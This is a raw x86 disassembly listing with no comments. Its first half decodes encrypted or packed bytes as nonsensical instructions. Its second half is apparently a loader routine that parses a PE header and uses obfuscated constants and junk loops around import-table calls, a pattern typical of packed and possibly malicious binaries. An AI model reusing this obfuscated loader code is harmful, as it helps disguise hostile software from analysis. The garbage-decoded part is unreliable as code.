  4137aa:	(bad)  
  4137ac:	mov    ebp,0xbe75b789
  4137b1:	xchg   ebx,eax
  4137b2:	adc    ch,BYTE PTR [eax+edx*8+0x4]
  4137b6:	sbb    eax,0x23b02b49
  4137bb:	stos   BYTE PTR es:[edi],al
  4137bc:	xchg   esi,eax
  4137bd:	and    eax,0xef2727ba
  4137c2:	(bad)  
  4137c3:	outs   dx,DWORD PTR ds:[esi]
  4137c4:	push   ebx
  4137c5:	scas   eax,DWORD PTR es:[edi]
  4137c6:	xor    al,0xae
  4137c8:	in     eax,0xd6
  4137ca:	cmc    
  4137cb:	stc    
  4137cc:	aad    0x75
  4137ce:	xor    ecx,esp
  4137d0:	add    BYTE PTR [esi-0x39],ch
  4137d3:	arpl   WORD PTR [edx-0x715c48db],sp
  4137d9:	mov    dl,0x5e
  4137db:	pop    ebp
  4137dc:	xchg   ebx,eax
  4137dd:	int3   
  4137de:	dec    edx
  4137df:	clc    
  4137e0:	loope  0x413853
  4137e2:	xchg   esi,eax
  4137e3:	and    eax,0xec8f49f0
  4137e8:	xor    BYTE PTR [ebx+edx*1],dl
  4137eb:	or     al,0x14
  4137ed:	xor    ch,dh
  4137ef:	outs   dx,BYTE PTR ds:[esi]
  4137f0:	xor    al,0x3a
  4137f2:	sub    ch,al
  4137f4:	fidiv  DWORD PTR [eax]
  4137f6:	aaa    
  4137f7:	adc    eax,0x50978e86
  4137fc:	push   ebp
  4137fd:	mov    DWORD PTR [ecx+0x129df5df],edi
  413803:	and    ebp,DWORD PTR [eax]
  413805:	sbb    al,0x14
  413807:	scas   al,BYTE PTR es:[edi]
  413808:	or     edi,edx
  41380a:	add    DWORD PTR [ebx-0x40f0468f],ebp
  413810:	es iret 
  413812:	pop    esi
  413813:	sub    DWORD PTR [ecx],esi
  413815:	push   cs
  413816:	rol    DWORD PTR ds:0x63050824,cl
  41381c:	push   ss
  41381d:	test   ebp,esp
  41381f:	sub    esi,DWORD PTR [edx+0x51]
  413822:	mov    eax,0xde31f6fc
  413827:	lds    edx,FWORD PTR [ebp-0x4e]
  41382a:	mov    ecx,0x4fc3095
  41382f:	mov    ds:0x1c926d88,al
  413834:	pop    es
  413835:	repnz (bad) 
  413837:	shl    DWORD PTR [edi],1
  413839:	lock or al,BYTE PTR [ebp+ecx*2+0x198f3bb8]
  413841:	in     eax,dx
  413842:	inc    edx
  413843:	sahf   
  413844:	dec    edi
  413845:	lock and dl,0x94
  413849:	xor    bh,BYTE PTR [eax]
  41384b:	pop    esp
  41384c:	jns    0x413893
  41384e:	popa   
  41384f:	sbb    eax,0x8b641d5e
  413854:	and    BYTE PTR [ebp+0x3977a1cc],0x11
  41385b:	or     al,0x4b
  41385d:	adc    edi,DWORD PTR [edx+0x4ace6d2a]
  413863:	dec    edx
  413864:	mov    esi,0xf660714f
  413869:	pop    ds
  41386a:	xlat   BYTE PTR ds:[ebx]
  41386b:	in     al,dx
  41386c:	div    BYTE PTR [edi]
  41386e:	dec    esi
  41386f:	jmp    0xd8c6:0xa1b69b1b
  413876:	jae    0x413816
  413878:	in     eax,0xc5
  41387a:	adc    DWORD PTR [esi-0x115536c4],ebp
  413880:	arpl   WORD PTR [ecx-0x754b83d0],ax
  413886:	or     al,0x68
  413888:	mov    WORD PTR [ecx-0x2],fs
  41388b:	lods   eax,DWORD PTR ds:[esi]
  41388c:	push   ss
  41388d:	and    BYTE PTR [ecx-0x25],dl
  413890:	add    al,0x35
  413892:	adc    BYTE PTR [ecx+0x6],0x83
  413896:	and    DWORD PTR [ecx],esi
  413898:	or     eax,0x2e6025cc
  41389d:	pop    edx
  41389e:	push   0xe41ac5a4
  4138a3:	mov    esp,ss
  4138a5:	jo     0x413915
  4138a7:	adc    ecx,DWORD PTR [ecx-0x62]
  4138aa:	cmp    bh,BYTE PTR [ebx-0x3fe0cec2]
  4138b0:	aas    
  4138b1:	ror    DWORD PTR [ecx],1
  4138b3:	dec    ecx
  4138b4:	loop   0x413843
  4138b6:	mov    dl,0xd1
  4138b8:	js     0x4138e6
  4138ba:	or     ch,BYTE PTR [ebx+0x6dda22c6]
  4138c0:	pop    ds
  4138c1:	in     al,dx
  4138c2:	loope  0x413928
  4138c4:	iret   
  4138c5:	les    edi,FWORD PTR [edi]
  4138c7:	push   eax
  4138c8:	and    al,0x24
  4138ca:	adc    al,0x97
  4138cc:	push   ebp
  4138cd:	push   esp
  4138ce:	mov    eax,ds:0xff35ad5f
  4138d3:	adc    al,al
  4138d5:	cmp    eax,0x33ec3836
  4138da:	add    eax,0xa8942491
  4138df:	xchg   esi,eax
  4138e0:	int    0xed
  4138e2:	mov    cl,0x13
  4138e4:	rcr    BYTE PTR ds:0x92f70114,cl
  4138ea:	push   edx
  4138eb:	dec    esp
  4138ec:	push   0x44b37f2e
  4138f1:	je     0x413896
  4138f3:	xor    al,cl
  4138f5:	jecxz  0x413897
  4138f7:	bound  esp,QWORD PTR [eax+eiz*2-0x4b5753c5]
  4138fe:	mov    eax,DWORD PTR [edx+0x3d395ab4]
  413904:	push   es
  413905:	jle    0x4138a8
  413907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413908:	rol    edx,cl
  41390a:	mov    esp,0xb47bf9a9
  41390f:	out    dx,al
  413910:	mov    ebp,0xed9ec7b
  413915:	pop    ds
  413916:	mov    bh,0x6f
  413918:	add    ecx,DWORD PTR ds:[edx]
  41391b:	or     ch,bh
  41391d:	lods   al,BYTE PTR ds:[esi]
  41391e:	sbb    BYTE PTR [ebx],dl
  413920:	(bad)  
  413922:	mov    eax,0x877954d7
  413927:	xor    BYTE PTR ds:0xebd17301,cl
  41392d:	xor    edx,edx
  41392f:	inc    eax
  413930:	pop    edi
  413931:	dec    eax
  413932:	sbb    ch,al
  413934:	rol    DWORD PTR [esi-0x49e71e15],cl
  41393a:	jno    0x413987
  41393c:	sbb    dl,dl
  41393e:	add    edx,DWORD PTR [edi-0x1d]
  413941:	cli    
  413942:	adc    DWORD PTR [edi+0x328b5e26],ecx
  413948:	cmc    
  413949:	jo     0x413910
  41394b:	push   esp
  41394c:	mov    ecx,0x5a488c35
  413951:	dec    eax
  413952:	hlt    
  413953:	xchg   esi,eax
  413954:	jae    0x4138ea
  413956:	mov    edi,0x18d16147
  41395b:	icebp  
  41395c:	dec    esi
  41395d:	and    edx,esi
  41395f:	pop    eax
  413960:	pop    edi
  413961:	fild   WORD PTR [ebx-0xc]
  413964:	cs pop eax
  413966:	rcr    DWORD PTR [edx+0x61aa4b79],1
  41396c:	mov    dh,0x4b
  41396e:	dec    eax
  41396f:	aas    
  413970:	jnp    0x4139c4
  413972:	sub    ecx,DWORD PTR [esi+0x77]
  413975:	and    eax,0x4effe792
  41397a:	aam    0x46
  41397c:	(bad)  
  41397d:	mov    bh,0xcc
  41397f:	faddp  st(5),st
  413981:	ins    DWORD PTR es:[edi],dx
  413982:	lahf   
  413983:	adc    eax,0xdf33d166
  413988:	dec    esi
  413989:	popf   
  41398a:	inc    edi
  41398b:	jge    0x4139c4
  41398d:	ja     0x4139f3
  41398f:	scas   eax,DWORD PTR es:[edi]
  413990:	leave  
  413991:	mov    al,ds:0x44946a1c
  413996:	test   al,0x66
  413998:	fsub   DWORD PTR [ebp+0x76]
  41399b:	mov    dh,0x91
  41399d:	(bad)  
  41399e:	sahf   
  41399f:	push   edi
  4139a0:	lds    ebp,FWORD PTR [ebx-0x26]
  4139a3:	xor    ch,BYTE PTR [edi-0x42]
  4139a6:	lods   eax,DWORD PTR ds:[esi]
  4139a7:	jno    0x4139c5
  4139a9:	mov    al,BYTE PTR [ebx]
  4139ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ac:	std    
  4139ad:	data16 jl 0x4139cd
  4139b0:	iret   
  4139b1:	cs in  al,dx
  4139b3:	pmulhw mm0,mm3
  4139b6:	inc    ecx
  4139b7:	inc    esi
  4139b8:	imul   eax,DWORD PTR [edi-0x17],0x3560b20b
  4139bf:	cmp    BYTE PTR [edi+0x258267a3],bl
  4139c5:	mov    ch,BYTE PTR [ebp-0x4250deb4]
  4139cb:	mov    ds:0x38af9340,eax
  4139d0:	or     eax,0x439c7f3f
  4139d5:	xchg   DWORD PTR [edx-0x7ae254e],ebx
  4139db:	xchg   BYTE PTR [ebp+0x6a513e15],dl
  4139e1:	rcl    BYTE PTR [ebp+0x3f],1
  4139e4:	mov    cs,esp
  4139e6:	in     al,0xae
  4139e8:	xchg   edi,eax
  4139e9:	in     eax,dx
  4139ea:	or     eax,0x4488c36b
  4139ef:	lds    ebp,FWORD PTR [esp+ecx*1+0x29315de1]
  4139f6:	clc    
  4139f7:	cli    
  4139f8:	add    edx,DWORD PTR [edx-0x36]
  4139fb:	rcl    ah,0x72
  4139fe:	inc    ebp
  4139ff:	fild   DWORD PTR [ebx+ecx*4]
  413a02:	imul   esp,DWORD PTR [esi],0xc417be7d
  413a08:	in     eax,0xfe
  413a0a:	xchg   esp,ecx
  413a0c:	push   ds
  413a0d:	dec    edi
  413a0e:	mov    edi,0xa5277631
  413a13:	mov    bh,BYTE PTR [ecx+eax*1]
  413a16:	inc    ecx
  413a17:	mov    ch,0xef
  413a19:	jbe    0x4139ff
  413a1b:	fisttp WORD PTR [ebx]
  413a1d:	ret    
  413a1e:	test   BYTE PTR gs:[ebp+0x3],0x60
  413a23:	(bad)  
  413a24:	adc    cl,BYTE PTR [ecx-0x41a4dc74]
  413a2a:	fld    st(2)
  413a2c:	mov    edi,esi
  413a2e:	test   eax,0x767e2f08
  413a33:	or     DWORD PTR [eax+eiz*8],esi
  413a36:	repz fsubr DWORD PTR [edi]
  413a39:	std    
  413a3a:	sahf   
  413a3b:	xor    BYTE PTR [edi-0x10],0x77
  413a3f:	mov    ss,WORD PTR [edx]
  413a41:	jb     0x413abe
  413a43:	aas    
  413a44:	push   ebp
  413a45:	mov    ah,0x9c
  413a47:	sub    BYTE PTR [ecx-0x61],cl
  413a4a:	and    cl,cl
  413a4c:	push   ebx
  413a4d:	pop    edi
  413a4e:	pop    es
  413a4f:	bound  ebp,QWORD PTR [ebx-0x270132b0]
  413a55:	hlt    
  413a56:	sbb    eax,0x56bc17c8
  413a5b:	or     dh,BYTE PTR [esi]
  413a5d:	mov    edx,DWORD PTR [edx+0x58]
  413a60:	daa    
  413a61:	(bad)  [edx-0x3ea9acd1]
  413a67:	push   ebx
  413a68:	pop    ss
  413a69:	fsub   QWORD PTR [edx]
  413a6b:	mov    ds:0xe5edea29,eax
  413a71:	fld    TBYTE PTR [edx-0x775cf74c]
  413a77:	or     eax,0xe729cbaf
  413a7c:	cmp    eax,ebp
  413a7e:	xchg   BYTE PTR [ebx+0x2482640f],dh
  413a84:	retf   0x8dbd
  413a87:	and    eax,0x59de5a90
  413a8c:	jge    0x413ae0
  413a8e:	mov    dl,0x92
  413a90:	ja     0x413a4d
  413a92:	cli    
  413a93:	dec    ebx
  413a94:	clc    
  413a95:	mov    ds:0x3b0f3acf,eax
  413a9a:	cmc    
  413a9b:	(bad)  
  413a9c:	jle    0x413aa8
  413a9e:	dec    esp
  413a9f:	xchg   esp,eax
  413aa0:	(bad)  
  413aa1:	(bad)  
  413aa2:	pop    ds
  413aa3:	xchg   ecx,eax
  413aa4:	inc    ebx
  413aa5:	bound  ebx,QWORD PTR [edx+0x32]
  413aa8:	outs   dx,DWORD PTR ds:[esi]
  413aa9:	lahf   
  413aaa:	aam    0xed
  413aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aad:	mov    dh,BYTE PTR [ebx+0x59]
  413ab0:	aam    0x2b
  413ab2:	mov    ah,0x68
  413ab4:	push   eax
  413ab5:	dec    ebp
  413ab6:	stos   BYTE PTR es:[edi],al
  413ab7:	adc    DWORD PTR [esp+ebx*2+0xf0a0c32],ecx
  413abe:	mov    esp,0x8acca97
  413ac3:	jge    0x413a78
  413ac5:	lahf   
  413ac6:	stos   BYTE PTR es:[edi],al
  413ac7:	int3   
  413ac8:	mov    cl,0xa3
  413aca:	xchg   al,ah
  413acc:	out    dx,al
  413acd:	gs mov al,0x69
  413ad0:	addr16 ds jg 0x413a9b
  413ad4:	ins    BYTE PTR es:[edi],dx
  413ad5:	sahf   
  413ad6:	fimul  DWORD PTR [edi]
  413ad8:	mov    ebp,0xcf57c520
  413add:	sbb    edx,edi
  413adf:	mov    dl,0x2d
  413ae1:	dec    edi
  413ae2:	pop    esi
  413ae3:	pop    ebp
  413ae4:	or     BYTE PTR [edx],0x3e
  413ae7:	lea    ebx,[edx-0x3198d512]
  413aed:	aad    0x7c
  413aef:	jmp    0x3377fa2
  413af4:	push   0x62531b56
  413af9:	mov    ds:0x7b02b4b7,al
  413afe:	dec    edi
  413aff:	cli    
  413b00:	sbb    eax,0xd0c8319f
  413b05:	jno    0x413aac
  413b07:	rcl    DWORD PTR [edx],0x95
  413b0a:	arpl   bp,si
  413b0c:	test   BYTE PTR [eax-0x39],bh
  413b0f:	mov    ds:0xbf80b92c,eax
  413b14:	nop
  413b15:	mov    ds,WORD PTR [edx+0x6d]
  413b18:	and    al,BYTE PTR [edx+ebp*2]
  413b1b:	pop    eax
  413b1c:	ds sub al,0x4
  413b1f:	xor    ch,bh
  413b21:	aam    0x73
  413b23:	rcl    BYTE PTR [edi],0x96
  413b26:	out    dx,eax
  413b27:	push   esi
  413b28:	mov    cl,0xf7
  413b2a:	or     dh,bl
  413b2c:	mov    al,ds:0x8cfcafe1
  413b31:	fdiv   QWORD PTR [edi]
  413b33:	daa    
  413b34:	dec    eax
  413b35:	push   ss
  413b36:	loop   0x413af4
  413b38:	or     BYTE PTR [ebp-0x5ae5012a],bl
  413b3e:	sbb    esi,eax
  413b40:	adc    eax,0x33d01396
  413b45:	inc    edi
  413b46:	lods   eax,DWORD PTR ds:[esi]
  413b47:	mov    ebp,?
  413b49:	cmp    cl,BYTE PTR [ebp-0x48]
  413b4c:	rcl    BYTE PTR [ebx+0x41],0xd9
  413b50:	iret   
  413b51:	xor    DWORD PTR [edi-0x3d],ebx
  413b54:	adc    DWORD PTR [edi+esi*4],ecx
  413b57:	xchg   esi,eax
  413b58:	out    dx,al
  413b59:	rcl    DWORD PTR [ecx+edx*2-0x230ac3aa],0x34
  413b61:	mov    ds:0xbc773ee,al
  413b66:	pop    eax
  413b67:	inc    edx
  413b68:	pop    ss
  413b69:	pop    esp
  413b6a:	cmp    DWORD PTR [eax-0x65],esi
  413b6d:	push   ss
  413b6e:	jbe    0x413b72
  413b70:	push   ecx
  413b71:	(bad)  
  413b72:	out    dx,al
  413b73:	add    esp,DWORD PTR [ebp+0x400214aa]
  413b79:	not    esi
  413b7b:	sbb    DWORD PTR [ebx-0x4fb95a5d],edi
  413b81:	cdq    
  413b82:	mov    edx,0xdfc832e1
  413b87:	add    sp,bp
  413b8a:	je     0x413b65
  413b8c:	and    ebx,esi
  413b8e:	sbb    al,0x7f
  413b90:	xor    BYTE PTR [edx+0x769fb06e],bl
  413b96:	ret    
  413b97:	mov    WORD PTR [ebp+0x3dac4ef5],fs
  413b9d:	(bad)  
  413b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b9f:	jl     0x413b4b
  413ba1:	fwait
  413ba2:	mov    ds:0x7af7a1f3,al
  413ba7:	xor    DWORD PTR ds:0xa1af1aa5,eax
  413bad:	mov    al,ds:0x3571213
  413bb2:	in     al,dx
  413bb3:	mul    BYTE PTR [esi+0x2a]
  413bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bb7:	dec    edx
  413bb8:	(bad)  
  413bba:	enter  0x9dba,0xa8
  413bbe:	push   es
  413bbf:	addr16 (bad) 
  413bc1:	cmp    al,0xcc
  413bc3:	inc    eax
  413bc4:	add    eax,0xf360b483
  413bc9:	mov    ecx,0xfc9ef6c8
  413bce:	add    eax,0x743dfee1
  413bd3:	shl    BYTE PTR [eax-0x757f8b42],1
  413bd9:	jecxz  0x413b5f
  413bdb:	scas   eax,DWORD PTR es:[edi]
  413bdc:	sar    DWORD PTR [ecx-0x3c],cl
  413bdf:	jmp    0xa9b2:0xf8d37121
  413be6:	(bad)  
  413be7:	int    0x83
  413be9:	add    edx,ecx
  413beb:	adc    edi,0xffffffff
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421c92
  413c08:	mov    ds:0x421c9a,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421a62
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x4238a8
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a2e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x4238c3
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423986
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a26
  413f9e:	mov    eax,ds:0x421a36
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421a8e
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c16
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x423a00
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
